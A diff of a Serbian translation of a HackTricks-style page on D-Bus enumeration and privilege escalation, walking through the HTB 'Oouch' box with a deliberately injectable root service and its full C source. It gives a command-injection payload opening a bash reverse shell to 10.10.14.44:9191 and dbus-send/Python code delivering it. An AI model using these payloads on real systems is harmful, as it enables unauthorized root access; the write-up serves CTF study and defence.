@@ -1,12 +1,14 @@
-# D-Bus Enumeration & Command Injection Privilege Escalation
+# Enumeracija D-Bus-a i eskalacija privilegija putem ubacivanja komandi
 
-## **GUI enumeration**
+{{#include ../../banners/hacktricks-training.md}}
 
-D-Bus is utilized as the inter-process communications (IPC) mediator in Ubuntu desktop environments. On Ubuntu, the concurrent operation of several message buses is observed: the system bus, primarily utilized by **privileged services to expose services relevant across the system**, and a session bus for each logged-in user, exposing services relevant only to that specific user. The focus here is primarily on the system bus due to its association with services running at higher privileges (e.g., root) as our objective is to elevate privileges. It is noted that D-Bus's architecture employs a 'router' per session bus, which is responsible for redirecting client messages to the appropriate services based on the address specified by the clients for the service they wish to communicate with.<sup>[[1]](#references)</sup>
+## **GUI enumeracija**
 
-Services on D-Bus are defined by the **objects** and **interfaces** they expose. Objects can be likened to class instances in standard OOP languages, with each instance uniquely identified by an **object path**. This path, akin to a filesystem path, uniquely identifies each object exposed by the service. A key interface for research purposes is the **org.freedesktop.DBus.Introspectable** interface, featuring a singular method, Introspect. This method returns an XML representation of the object's supported methods, signals, and properties, with a focus here on methods while omitting properties and signals.
+D-Bus se koristi kao posrednik za međuprocesnu komunikaciju (IPC) u Ubuntu desktop okruženjima. Na Ubuntu-u se istovremeno koristi nekoliko message bus-ova: system bus, koji prvenstveno koriste **privileged services za izlaganje servisa relevantnih za ceo sistem**, i session bus za svakog prijavljenog korisnika, koji izlaže servise relevantne samo za tog korisnika. Ovde je fokus prvenstveno na system bus-u zbog njegove povezanosti sa servisima koji se izvršavaju sa višim privilegijama (npr. root), pošto je naš cilj eskalacija privilegija. Arhitektura D-Bus-a koristi po jedan „router“ za svaki session bus, koji preusmerava poruke klijenata odgovarajućim servisima na osnovu adrese koju klijenti navedu za servis sa kojim žele da komuniciraju.<sup>[[1]](#references)</sup>
 
-For communication with the D-Bus interface, two tools were employed: a CLI tool named **gdbus** for easy invocation of methods exposed by D-Bus in scripts, and [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), a Python-based GUI tool designed to enumerate the services available on each bus and to display the objects contained within each service.
+Servisi na D-Bus-u definisani su pomoću **objekata** i **interfejsa** koje izlažu. Objekti se mogu uporediti sa instancama klasa u standardnim OOP jezicima, pri čemu je svaka instanca jedinstveno identifikovana pomoću **putanje objekta**. Ova putanja, slično putanji u filesystem-u, jedinstveno identifikuje svaki objekat koji servis izlaže. Jedan od ključnih interfejsa za potrebe istraživanja jeste interfejs **org.freedesktop.DBus.Introspectable**, koji sadrži jednu metodu, Introspect. Ova metoda vraća XML reprezentaciju metoda, signala i svojstava koje objekat podržava; ovde je fokus na metodama, dok se svojstva i signali izostavljaju.
+
+Za komunikaciju sa D-Bus interfejsom korišćena su dva alata: CLI alat pod nazivom **gdbus**, za jednostavno pozivanje metoda koje D-Bus izlaže u skriptama, i [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), GUI alat zasnovan na Python-u, namenjen enumeraciji servisa dostupnih na svakom bus-u i prikazivanju objekata sadržanih u svakom servisu.
 ```bash
 sudo apt-get install d-feet
 ```
@@ -18,21 +20,21 @@ echo "$DBUS_SESSION_BUS_ADDRESS"
 
 ![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)
 
-Na prvoj slici prikazane su services registrovane na D-Bus system bus-u, pri čemu je **org.debin.apt** posebno istaknut nakon izbora dugmeta System Bus. D-Feet šalje upite ovom service-u za objekte i prikazuje interfaces, methods, properties i signals izabranih objekata, kao što se vidi na drugoj slici. Takođe je detaljno prikazan signature svakog method-a.
+Na prvoj slici prikazane su usluge registrovane na D-Bus system bus-u, pri čemu je **org.debin.apt** posebno istaknut nakon izbora dugmeta System Bus. D-Feet šalje upite ovoj usluzi za objekte i prikazuje interfejse, metode, svojstva i signale za izabrane objekte, što se vidi na drugoj slici. Potpis svake metode je takođe detaljno prikazan.
 
-Značajna funkcija je prikaz **process ID-ja (pid)** i **command line-a** service-a, što je korisno za proveru da li service radi sa povišenim privilegijama, što je važno za relevantnost istraživanja.
+Značajna funkcija je prikaz **ID-a procesa (pid)** usluge i **command line-a**, što je korisno za potvrdu da li se usluga izvršava sa povišenim privilegijama, što je važno za relevantnost istraživanja.
 
-**D-Feet takođe omogućava pozivanje method-a**: korisnici mogu uneti Python izraze kao parametre, koje D-Feet pretvara u D-Bus types pre prosleđivanja service-u.
+**D-Feet takođe omogućava pozivanje metoda**: korisnici mogu uneti Python izraze kao parametre, koje D-Feet pretvara u D-Bus tipove pre prosleđivanja usluzi.
 
-Međutim, imajte na umu da **neki method-i zahtevaju authentication** pre nego što nam dozvole da ih pozovemo. Ignorisaćemo ove method-e, pošto je naš cilj da u prvom redu podignemo privilegije bez credentials-a.
+Međutim, imajte na umu da **neke metode zahtevaju authentication** pre nego što nam dozvole da ih pozovemo. Ignorisaćemo ove metode, jer je naš cilj da podignemo svoje privilegije bez credentials već na prvom mestu.
 
-Takođe imajte na umu da neki service-i šalju upite drugom D-Bus service-u pod nazivom org.freedeskto.PolicyKit1 kako bi proverili da li korisniku treba dozvoliti izvršavanje određenih actions ili ne.
+Takođe imajte na umu da neke usluge šalju upite drugoj D-Bus usluzi pod nazivom org.freedeskto.PolicyKit1 da bi utvrdile da li korisniku treba dozvoliti izvršavanje određenih radnji ili ne.
 
 ## **Enumeracija komandne linije**
 
-### Izlistavanje objekata service-a
+### Izlistavanje objekata servisa
 
-Otvorene D-Bus interfaces moguće je izlistati pomoću:
+Moguće je izlistati otvorene D-Bus interfejse pomoću:
 ```bash
 busctl list #List D-Bus interfaces
 
@@ -56,20 +58,20 @@ org.freedesktop.PolicyKit1               - -               -                (act
 org.freedesktop.hostname1                - -               -                (activatable) -                         -
 org.freedesktop.locale1                  - -               -                (activatable) -                         -
 ```
-Servisi označeni kao **`(activatable)`** posebno su interesantni jer **još nisu pokrenuti**, ali bus zahtev može da ih pokrene na zahtev. Nemojte se zaustaviti na `busctl list`; povežite ta imena sa stvarnim binarnim datotekama koje bi izvršili.
+Servisi označeni kao **`(activatable)`** posebno su interesantni jer **još nisu pokrenuti**, ali ih bus request može pokrenuti na zahtev. Nemojte se zaustaviti na `busctl list`; povežite ta imena sa stvarnim binarnim datotekama koje bi izvršili.
 ```bash
 ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
 grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
 ```
-To vam brzo govori koja će `Exec=` putanja biti pokrenuta za aktivatable name i pod kojim identitetom. Ako su binary ili njegov lanac izvršavanja slabo zaštićeni, inactive service i dalje može postati put za privilege escalation.
+To vam brzo govori koja će `Exec=` putanja biti pokrenuta za aktivatable name i pod kojim identitetom. Ako su binarna datoteka ili njen execution chain slabo zaštićeni, neaktivni servis i dalje može postati putanja za privilege escalation.
 
-#### Veze
+#### Connections
 
-[Sa Wikipedije:](https://en.wikipedia.org/wiki/D-Bus) Kada process uspostavi connection sa bus-om, bus toj connection-i dodeljuje posebno bus ime pod nazivom _unique connection name_. Bus imena ovog tipa su nepromenljiva — garantovano je da se neće promeniti dok god connection postoji — i, što je još važnije, ne mogu se ponovo koristiti tokom životnog veka bus-a. To znači da nijedna druga connection sa tim bus-om nikada neće dobiti takvo unique connection name, čak ni ako isti process zatvori connection sa bus-om i kreira novu. Unique connection names se lako prepoznaju jer počinju znakom dvotačke, koji je inače zabranjen.<sup>[[4]](#references)</sup>
+[Sa Wikipedije:](https://en.wikipedia.org/wiki/D-Bus) Kada proces uspostavi konekciju sa bus-om, bus toj konekciji dodeljuje posebno bus ime pod nazivom _unique connection name_. Bus imena ovog tipa su nepromenljiva — garantovano je da se neće promeniti dok god konekcija postoji — i, što je još važnije, ne mogu se ponovo koristiti tokom životnog veka bus-a. To znači da nijedna druga konekcija sa tim bus-om nikada neće dobiti tako jedinstveno ime konekcije, čak i ako isti proces zatvori konekciju sa bus-om i kreira novu. Unique connection names se lako prepoznaju jer počinju znakom dvotačke, koji je inače nedozvoljen.<sup>[[4]](#references)</sup>
 
-### Informacije o Service Object-u
+### Informacije o servisnom objektu
 
-Zatim možete dobiti određene informacije o interface-u pomoću:
+Zatim možete dobiti određene informacije o interfejsu pomoću:
 ```bash
 busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface
 
@@ -129,17 +131,17 @@ cap_mknod cap_lease cap_audit_write cap_audit_control
 cap_setfcap cap_mac_override cap_mac_admin cap_syslog
 cap_wake_alarm cap_block_suspend cap_audit_read
 ```
-Takođe povežite naziv bus-a sa njegovom `systemd` jedinicom i putanjom izvršne datoteke:
+Takođe povežite naziv bus-a sa njegovom `systemd` jedinicom i putanjom do izvršne datoteke:
 ```bash
 systemctl status dbus-server.service --no-pager
 systemctl cat dbus-server.service
 namei -l /root/dbus-server
 ```
-Ovo odgovara na operativno pitanje koje je važno tokom privesc-a: **ako poziv metode uspe, koji će stvarni binarni fajl i unit izvršiti radnju?**
+Ovo odgovara na operativno pitanje koje je važno tokom privesc-a: **ako poziv metode uspe, koji će stvarni binary i unit izvršiti radnju?**
 
-### Izlistavanje interfejsa service objekta
+### Izlistavanje interfejsa servisnog objekta
 
-Morate imati dovoljno dozvola.
+Potrebno je da imate dovoljno dozvola.
 ```bash
 busctl tree htb.oouch.Block #Get Interfaces of the service object
 
@@ -147,9 +149,9 @@ busctl tree htb.oouch.Block #Get Interfaces of the service object
 └─/htb/oouch
 └─/htb/oouch/Block
 ```
-### Introspect interfejs servisnog objekta
+### Introspekcija interfejsa servisnog objekta
 
-Obratite pažnju na to da je u ovom primeru izabran najnoviji otkriveni interfejs korišćenjem parametra `tree` (_pogledajte prethodni odeljak_):
+Imajte na umu da je u ovom primeru izabran najnoviji otkriveni interfejs pomoću parametra `tree` (_pogledajte prethodni odeljak_):
 ```bash
 busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface
 
@@ -167,18 +169,18 @@ org.freedesktop.DBus.Properties     interface -         -            -
 .Set                                method    ssv       -            -
 .PropertiesChanged                  signal    sa{sv}as  -            -
 ```
-Obratite pažnju na metod `.Block` interfejsa `htb.oouch.Block` (onaj koji nas zanima). Slovo „s“ u drugim kolonama može značiti da očekuje string.
+Obratite pažnju na metodu `.Block` interfejsa `htb.oouch.Block` (onu koja nas zanima). Slovo „s“ u drugim kolonama može značiti da se očekuje string.
 
-Pre nego što pokušate bilo šta opasno, prvo proverite metod **orijentisan za čitanje** ili neki drugi metod niskog rizika. Time se jasno razlikuju tri slučaja: pogrešna sintaksa, metod je dostupan, ali je pristup odbijen, ili je metod dostupan i pristup dozvoljen.
+Pre nego što pokušate nešto opasno, prvo proverite metodu **read-oriented** ili na drugi način niskorizičnu metodu. Tako se jasno razdvajaju tri slučaja: pogrešna sintaksa, metoda je dostupna, ali je pristup odbijen, ili je metoda dostupna i pristup je dozvoljen.
 ```bash
 busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
 gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
 ```
-### Korelacija D-Bus metoda sa pravilima i radnjama
+### Korelacija D-Bus metoda sa policies i actions
 
-Introspection vam govori **šta** možete da pozovete, ali ne govori **zašto** je poziv dozvoljen ili odbijen. Za stvarnu privesc triage analizu obično je potrebno da zajedno pregledate **tri sloja**:
+Introspection vam govori **šta** možete da pozovete, ali ne govori **zašto** je poziv dozvoljen ili odbijen. Za stvarni privesc triage obično je potrebno zajedno pregledati **tri sloja**:
 
-1. **Activation metadata** (`.service` fajlovi ili `SystemdService=`) da biste saznali koji će se binary i unit zaista pokrenuti.
+1. **Activation metadata** (`.service` fajlovi ili `SystemdService=`) da biste saznali koji će se binary i unit zapravo pokrenuti.
 2. **D-Bus XML policy** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`) da biste saznali ko može da `own`, `send_destination` ili `receive_sender`.
 3. **Polkit action files** (`/usr/share/polkit-1/actions/*.policy`) da biste saznali podrazumevani authorization model (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).
 
@@ -189,22 +191,22 @@ grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /
 grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
 pkaction --verbose
 ```
-Nemojte pretpostaviti mapiranje 1:1 između D-Bus metode i Polkit akcije. Ista metoda može izabrati drugu akciju u zavisnosti od objekta koji se menja ili konteksta tokom izvršavanja. Zato je praktičan tok rada:
+Nemojte pretpostavljati mapiranje 1:1 između D-Bus metode i Polkit akcije. Ista metoda može izabrati drugu akciju u zavisnosti od objekta koji se menja ili konteksta tokom izvršavanja. Zato je praktičan tok rada:
 
 1. `busctl introspect` / `gdbus introspect`
-2. `pkaction --verbose` i pretraga relevantnih `.policy` datoteka
-3. bezbedne probe uživo pomoću `busctl call`, `gdbus call` ili `dbusmap --enable-probes --null-agent`
+2. `pkaction --verbose` i pretraga relevantnih `.policy` fajlova
+3. live probe niskog rizika pomoću `busctl call`, `gdbus call` ili `dbusmap --enable-probes --null-agent`
 
-Proxy ili compatibility servisi zahtevaju posebnu pažnju. **Proxy koji radi kao root** i prosleđuje zahteve drugom D-Bus servisu preko sopstvene, unapred uspostavljene veze može nenamerno dovesti do toga da backend svaki zahtev tretira kao da dolazi od UID-a 0, osim ako se identitet prvobitnog pozivaoca ponovo ne proveri.<sup>[[3]](#references)</sup>
+Proxy ili compatibility servisi zaslužuju dodatnu pažnju. **Proxy koji radi kao root** i prosleđuje zahteve drugom D-Bus servisu preko sopstvene unapred uspostavljene konekcije može nenamerno dovesti do toga da backend svaki zahtev tretira kao da dolazi od UID 0, osim ako se identitet izvornog pozivaoca ponovo ne proverava.<sup>[[3]](#references)</sup>
 
-### Interfejs za nadgledanje/hvatanje
+### Interfejs za nadgledanje/zarobljavanje
 
-Uz dovoljno privilegija (samo `send_destination` i `receive_sender` privilegije nisu dovoljne) možete **nadgledati D-Bus komunikaciju**.
+Uz dovoljno privilegija (same `send_destination` i `receive_sender` privilegije nisu dovoljne) možete **nadgledati D-Bus komunikaciju**.
 
 Da biste **nadgledali** **komunikaciju**, morate biti **root**. Ako i dalje nailazite na probleme kao root, proverite [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) i [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)
 
 > [!WARNING]
-> Ako znate kako da konfigurišete D-Bus config datoteku tako da **non-root users mogu da prisluškuju** komunikaciju, **kontaktirajte me**!
+> Ako znate kako da konfigurišete D-Bus config fajl tako da **non-root korisnicima dozvoli njuškanje** komunikacije, molim vas **kontaktirajte me**!
 
 Različiti načini za nadgledanje:
 ```bash
@@ -212,7 +214,7 @@ sudo busctl monitor htb.oouch.Block #Monitor only specified
 sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
 sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
 ```
-U sledećem primeru interfejs `htb.oouch.Block` se nadgleda i **poruka "**_**lalalalal**_**" se šalje putem miscommunication**:
+U sledećem primeru interfejs `htb.oouch.Block` se nadgleda i **poruka "**_**lalalalal**_**" se šalje zbog pogrešne komunikacije**:
 ```bash
 busctl monitor htb.oouch.Block
 
@@ -231,18 +233,18 @@ MESSAGE "s" {
 STRING "Carried out :D";
 };
 ```
-Možete koristiti `capture` umesto `monitor` da sačuvate rezultate u **pcapng** fajl koji Wireshark može da otvori:
+Možete koristiti `capture` umesto `monitor` da biste sačuvali rezultate u datoteci **pcapng** koju Wireshark može da otvori:
 ```bash
 sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
 sudo busctl capture > system-bus.pcapng
 ```
 #### Filtriranje sve buke <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>
 
-Ako na bus-u ima previše informacija, prosledite match rule ovako:
+Ako na busu ima previše informacija, prosledite match rule ovako:
 ```bash
 dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
 ```
-Može se navesti više pravila. Ako poruka odgovara _bilo kom_ od pravila, poruka će biti ispisana. Ovako:
+Može se navesti više pravila. Ako poruka odgovara _bilo kom_ od pravila, poruka će biti prikazana. Ovako:
 ```bash
 dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
 ```
@@ -250,15 +252,15 @@ dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
 ```bash
 dbus-monitor "type=method_call" "type=method_return" "type=error"
 ```
-Pogledajte [D-Bus dokumentaciju](http://dbus.freedesktop.org/doc/dbus-specification.html) za više informacija o sintaksi pravila podudaranja.<sup>[[7]](#references)</sup>
+Pogledajte [D-Bus dokumentaciju](http://dbus.freedesktop.org/doc/dbus-specification.html) za više informacija o sintaksi match rule-a.<sup>[[7]](#references)</sup>
 
-### Još
+### Više
 
 `busctl` ima još više opcija, [**pronađite ih sve ovde**](https://www.freedesktop.org/software/systemd/man/busctl.html).
 
 ## **Ranjivi scenario**
 
-Kao korisnik **qtc unutar hosta „oouch“ sa HTB-a**, možete pronaći **neočekivanu D-Bus config datoteku** koja se nalazi u _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
+Kao korisnik **qtc unutar hosta „oouch“ sa HTB-a**, možete pronaći **neočekivani D-Bus config fajl** koji se nalazi na putanji _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->
 
@@ -279,9 +281,9 @@ Kao korisnik **qtc unutar hosta „oouch“ sa HTB-a**, možete pronaći **neoč
 
 </busconfig>
 ```
-Iz prethodne konfiguracije imajte na umu da **morate biti korisnik `root` ili `www-data` da biste slali i primali informacije** putem ove D-BUS komunikacije.
+Iz prethodne konfiguracije znamo da **morate biti korisnik `root` ili `www-data` da biste slali i primali informacije** putem ove D-BUS komunikacije.
 
-Kao korisnik **qtc** unutar docker kontejnera **aeb4525789d8** možete pronaći kod povezan sa dbus-om u datoteci _/code/oouch/routes.py._ Ovo je zanimljiv kod:
+Kao korisnik **qtc** unutar docker kontejnera **aeb4525789d8**, možete pronaći kod povezan sa dbus-om u datoteci _/code/oouch/routes.py._ Ovo je relevantan kod:
 ```python
 if primitive_xss.search(form.textfield.data):
 bus = dbus.SystemBus()
@@ -293,14 +295,14 @@ response = block_iface.Block(client_ip)
 bus.close()
 return render_template('hacker.html', title='Hacker')
 ```
-Kao što možete videti, ono se **povezuje sa D-Bus interfejsom** i funkciji **"Block"** šalje vrednost "client_ip".
+Kao što možete videti, on se **povezuje sa D-Bus interfejsom** i funkciji **„Block“** šalje vrednost „client_ip“.
 
-Sa druge strane D-Bus veze izvršava se neki C kompajlirani binarni fajl. Ovaj kod **osluškuje** D-Bus vezu **u potrazi za IP adresom i poziva iptables putem funkcije `system`** kako bi blokirao datu IP adresu.\
+Sa druge strane D-Bus veze nalazi se neki kompajlirani binarni fajl napisan u jeziku C. Ovaj kod **osluškuje** D-Bus vezu **u potrazi za IP adresom i poziva iptables putem funkcije `system`** kako bi blokirao datu IP adresu.\
 **Poziv funkcije `system` je namerno ranjiv na command injection**, pa će payload poput sledećeg kreirati reverse shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`
 
-### Iskoristite ga
+### Exploit it
 
-Na kraju ove stranice možete pronaći **kompletan C kod D-Bus aplikacije**. U njemu, između linija 91–97, možete pronaći **način registracije `D-Bus object path`** i **`interface name`**. Ove informacije će biti neophodne za slanje informacija D-Bus vezi:
+Na kraju ove stranice možete pronaći **kompletan C kod D-Bus aplikacije**. U njemu, između linija 91–97, možete videti **kako su registrovani `D-Bus object path`** i **`interface name`**. Ove informacije će biti neophodne za slanje podataka D-Bus vezi:
 ```c
 /* Install the object */
 r = sd_bus_add_object_vtable(bus,
@@ -310,13 +312,13 @@ r = sd_bus_add_object_vtable(bus,
 block_vtable,
 NULL);
 ```
-Takođe, u liniji 57 možete videti da je **jedini registrovani method** za ovu D-Bus komunikaciju nazvan `Block`(_**Zato će u sledećem odeljku payload-i biti poslati service object-u `htb.oouch.Block`, interface-u `/htb/oouch/Block` i method-u `Block`**_):
+Takođe, u redu 57 možete videti da je **jedini registrovani metod** za ovu D-Bus komunikaciju nazvan `Block`(_**Zato će u sledećem odeljku payloads biti poslati objektu usluge `htb.oouch.Block`, interfejsu `/htb/oouch/Block` i metodu `Block`**_):
 ```c
 SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
 ```
 #### Python
 
-Sledeći python kod će poslati payload D-Bus konekciji, metodi `Block`, putem `block_iface.Block(runme)` (_imajte na umu da je izdvojen iz prethodnog dela koda_):
+Sledeći python kod će poslati payload D-Bus konekciji ka metodi `Block` putem `block_iface.Block(runme)` (_imajte na umu da je izdvojen iz prethodnog dela koda_):
 ```python
 import dbus
 bus = dbus.SystemBus()
@@ -331,13 +333,13 @@ bus.close()
 dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
 ```
 - `dbus-send` je alat koji se koristi za slanje poruka u „Message Bus“
-- Message Bus – softver koji sistemi koriste kako bi komunikacija između aplikacija bila jednostavna. Povezan je sa Message Queue (poruke su poređane po redosledu), ali se u Message Bus poruke šalju po subscription modelu i takođe veoma brzo.
-- Oznaka „-system“ koristi se za navođenje da je to sistemska poruka, a ne session poruka (podrazumevano).
-- Oznaka „–print-reply“ koristi se za pravilno ispisivanje naše poruke i primanje odgovora u formatu čitljivom ljudima.
-- „–dest=Dbus-Interface-Block“ Adresa Dbus interfejsa.
-- „–string:“ – Tip poruke koju želimo da pošaljemo interfejsu. Postoji nekoliko formata za slanje poruka, kao što su double, bytes, booleans, int i objpath. Od ovih formata, „object path“ je koristan kada želimo da pošaljemo putanju datoteke Dbus interfejsu. U ovom slučaju možemo da koristimo specijalnu datoteku (FIFO) kako bismo prosledili komandu interfejsu u obliku imena datoteke. „string:;“ – Ovo služi za ponovno pozivanje object path-a, gde postavljamo FIFO reverse shell datoteku/komandu.
+- Message Bus – softver koji sistemi koriste kako bi olakšali komunikaciju između aplikacija. Povezan je sa Message Queue (poruke se redom postavljaju u niz), ali se u Message Bus poruke šalju po subscription modelu i to veoma brzo.
+- oznaka „-system“ koristi se za označavanje da je to system message, a ne session message (podrazumevano).
+- oznaka „–print-reply“ koristi se za pravilno ispisivanje naše poruke i prijem odgovora u formatu čitljivom čoveku.
+- „–dest=Dbus-Interface-Block“ je adresa Dbus interface-a.
+- „–string:“ – tip poruke koju želimo da pošaljemo interface-u. Postoji nekoliko formata za slanje poruka, kao što su double, bytes, booleans, int i objpath. Od ovih formata, „object path“ je koristan kada želimo da pošaljemo putanju do fajla Dbus interface-u. U ovom slučaju možemo koristiti poseban fajl (FIFO) kako bismo prosledili command interface-u u obliku imena fajla. „string:;“ – koristi se za ponovno pozivanje object path-a, gde postavljamo FIFO reverse shell fajl/command.
 
-_Napomena: u `htb.oouch.Block.Block`, prvi deo (`htb.oouch.Block`) upućuje na service object, a poslednji deo (`.Block`) upućuje na naziv metode._
+_Napomena: u `htb.oouch.Block.Block`, prvi deo (`htb.oouch.Block`) upućuje na service object, a poslednji deo (`.Block`) upućuje na naziv method-a._
 
 ### C code
 ```c:d-bus_server.c
@@ -480,13 +482,13 @@ sd_bus_unref(bus);
 return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
 }
 ```
-## Pomagala za automatizovanu enumeraciju (2023-2025)
+## Pomoćni alati za automatizovanu enumeraciju (2023-2025)
 
-Ručno enumerisanje velike D-Bus attack surface pomoću `busctl`/`gdbus` brzo postaje naporno. Dva mala FOSS alata objavljena tokom poslednjih nekoliko godina mogu ubrzati rad tokom red-team ili CTF angažmana:
+Ručno enumerisanje velike D-Bus attack surface pomoću alata `busctl`/`gdbus` brzo postaje naporno. Dva mala FOSS uslužna programa objavljena poslednjih nekoliko godina mogu ubrzati rad tokom red-team ili CTF angažmana:
 
 ### dbusmap ("Nmap for D-Bus")
 * Autor: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)<sup>[[5]](#references)</sup>
-* Napisan u jeziku C; jedna statička binarna datoteka (<50 kB) koja prolazi kroz svaku putanju objekta, preuzima XML `Introspect` i mapira ga na PID/UID vlasnika.<sup>[[5]](#references)</sup>
+* Napisan u jeziku C; jedna statička binarna datoteka (<50 kB) koja prolazi kroz svaku putanju objekta, preuzima `Introspect` XML i mapira je na PID/UID vlasnika.<sup>[[5]](#references)</sup>
 * Korisne opcije:
 ```bash
 # List every service on the *system* bus and dump all callable methods
@@ -495,17 +497,17 @@ sudo dbus-map --dump-methods
 # Actively probe methods/properties you can reach without Polkit prompts
 sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
 ```
-* Alat označava nezaštićena well-known imena znakom `!`, čime se trenutno otkrivaju servisi koje možete *preuzeti* (take over) ili pozivi metoda kojima se može pristupiti iz neprivilegovane shell sesije.
+* Alat označava nezaštićena well-known imena znakom `!`, odmah otkrivajući servise koje možete *preuzeti* (take over) ili pozive metoda kojima se može pristupiti iz neprivilegovanog shell-a.
 
 ### uptux.py
 * Autor: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)<sup>[[6]](#references)</sup>
-* Skripta zasnovana isključivo na Pythonu koja traži *writable* putanje u systemd jedinicama **i** previše permisivne D-Bus policy datoteke (npr. `send_destination="*"`).<sup>[[6]](#references)</sup>
+* Python-only skripta koja traži *writable* putanje u systemd jedinicama **i** previše permisivne D-Bus policy datoteke (npr. `send_destination="*"`).<sup>[[6]](#references)</sup>
 * Brza upotreba:
 ```bash
 python3 uptux.py -n          # run all checks but don’t write a log file
 python3 uptux.py -d          # enable verbose debug output
 ```
-* D-Bus modul pretražuje navedene direktorijume i ističe svaki servis koji normalan korisnik može spoof-ovati ili hijack-ovati:
+* D-Bus modul pretražuje navedene direktorijume i ističe svaki servis koji normalan korisnik može da spoofuje ili hijack-uje:
 * `/etc/dbus-1/system.d/` i `/usr/share/dbus-1/system.d/`
 * `/etc/dbus-1/system-local.d/` (vendor overrides)
 
@@ -513,15 +515,15 @@ python3 uptux.py -d          # enable verbose debug output
 
 ## Značajne D-Bus greške za eskalaciju privilegija (2024-2025)
 
-Praćenje nedavno objavljenih CVE-ova pomaže u uočavanju sličnih nebezbednih obrazaca u prilagođenom kodu. Dva dobra novija primera su:<sup>[[2]](#references)[[3]](#references)</sup>
+Praćenje nedavno objavljenih CVE-ova pomaže u uočavanju sličnih nesigurnih obrazaca u prilagođenom kodu. Dva dobra novija primera su:<sup>[[2]](#references)[[3]](#references)</sup>
 
-| Godina | CVE | Komponenta | Osnovni uzrok | Ofanzivna pouka |
+| Year | CVE | Component | Root Cause | Offensive lesson |
 |------|-----|-----------|------------|------------------|
-| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | Servis koji se izvršava kao root izložio je D-Bus interfejs koji su neprivilegovani korisnici mogli da rekonfigurišu, uključujući učitavanje ponašanja makroa pod kontrolom napadača. | Ako daemon izlaže **upravljanje uređajem/profilom/konfiguracijom** na sistemskoj magistrali, tretirajte writable konfiguraciju i funkcije makroa kao primitive za izvršavanje koda, a ne samo kao „podešavanja“. |
-| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | Proxy za kompatibilnost koji se izvršava kao root prosleđivao je zahteve backend servisima bez očuvanja bezbednosnog konteksta originalnog pozivaoca, pa su backend servisi verovali proxyju kao UID 0. | Tretirajte **proxy / bridge / compatibility** D-Bus servise kao posebnu klasu grešaka: ako prosleđuju privilegovane pozive, proverite kako UID pozivaoca/Polkit kontekst stiže do backend-a. |
+| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | Servis koji radi kao root izložio je D-Bus interfejs koji su neprivilegovani korisnici mogli da rekonfigurišu, uključujući učitavanje macro ponašanja pod kontrolom napadača. | Ako daemon izlaže **upravljanje uređajem/profilom/konfiguracijom** na system bus-u, tretirajte writable konfiguraciju i macro funkcije kao primitive za izvršavanje koda, a ne samo kao "podešavanja". |
+| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | Kompatibilni proxy koji radi kao root prosleđivao je zahteve backend servisima bez očuvanja bezbednosnog konteksta prvobitnog pozivaoca, pa su backend servisi verovali proxy-ju kao UID 0. | Tretirajte **proxy / bridge / compatibility** D-Bus servise kao zasebnu klasu grešaka: ako prosleđuju privilegovane pozive, proverite kako UID pozivaoca/Polkit kontekst dospeva do backend-a. |
 
 Obratite pažnju na sledeće obrasce:
-1. Servis se izvršava **kao root na sistemskoj magistrali**.
+1. Servis radi **kao root na system bus-u**.
 2. Ili **ne postoji provera autorizacije**, ili se provera vrši nad **pogrešnim subjektom**.
 3. Dostupna metoda na kraju menja stanje sistema: instalacija paketa, izmene korisnika/grupa, konfiguracija bootloader-a, ažuriranje profila uređaja, upis u datoteke ili direktno izvršavanje komandi.
 
@@ -529,23 +531,23 @@ Koristite `dbusmap --enable-probes` ili ručni `busctl call` da potvrdite da li 
 
 ---
 
-## Brze pobede za hardening i detekciju
+## Brze mere za hardening i detekciju
 
-* Pretražite policy-je koji su writable za sve ili otvoreni za *send/receive*:
+* Pretražite policy-je koji su world-writable ili otvoreni za *send/receive*:
 ```bash
